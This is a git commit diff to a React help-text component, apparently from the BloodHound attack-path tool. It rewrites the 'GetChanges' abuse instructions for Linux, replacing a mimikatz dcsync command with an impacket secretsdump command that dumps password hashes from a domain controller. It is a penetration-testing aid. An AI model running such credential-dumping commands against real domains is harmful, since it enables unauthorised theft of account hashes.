59c534c10e893516fa28edfa24255efb2c5baf27
Shutdown <nwodtuhs+github@pm.me>
2022-12-19 17:48:55 +0100

    GetChanges Linux abuse

--- src/components/Modals/HelpTexts/GetChanges/LinuxAbuse.jsx
+++ src/components/Modals/HelpTexts/GetChanges/LinuxAbuse.jsx
@@ -1,20 +1,21 @@
 import React from 'react';
 
-const Abuse = () => {
+const LinuxAbuse = () => {
     return (
         <>
             <p>
-                With both GetChanges and GetChangesAll privileges in BloodHound,
-                you may perform a dcsync attack to get the password hash of an
-                arbitrary principal using mimikatz:
+                You may perform a dcsync attack to get the password hash of an
+                arbitrary principal using impacket's secretsdump.py example script:
             </p>
+
             <pre>
                 <code>
                     {
-                        'lsadump::dcsync /domain:testlab.local /user:Administrator'
+                        "secretsdump 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"
                     }
                 </code>
             </pre>
+
             <p>
                 You can also perform the more complicated ExtraSids attack to
                 hop domain trusts. For information on this see the blog post by
@@ -24,4 +25,4 @@ const Abuse = () => {
     );
 };
 
-export default Abuse;
+export default LinuxAbuse;
